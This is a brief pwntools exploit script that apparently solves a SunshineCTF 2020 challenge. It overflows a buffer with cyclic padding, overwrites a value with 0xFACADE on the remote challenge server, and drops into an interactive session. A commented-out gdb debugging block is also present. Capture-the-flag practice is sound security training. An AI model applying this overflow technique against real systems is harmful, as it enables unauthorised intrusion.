from pwn import *
'''
p = process("./chall01")

gdb.attach(p, """
    b *$rebase(0x0797)
""")
'''

p = remote("chal.2020.sunshinectf.org", 30001)

buf = b''
buf += cyclic(cyclic_find("abdaabeaab"))
buf += p32(0xFACADE)
#buf += cyclic(0x200)

p.sendline(buf)

#p.sendline(cyclic(cyclic_find("paaaqaaaraaasaaata")) + p32(0x0FACADE))

p.interactive()
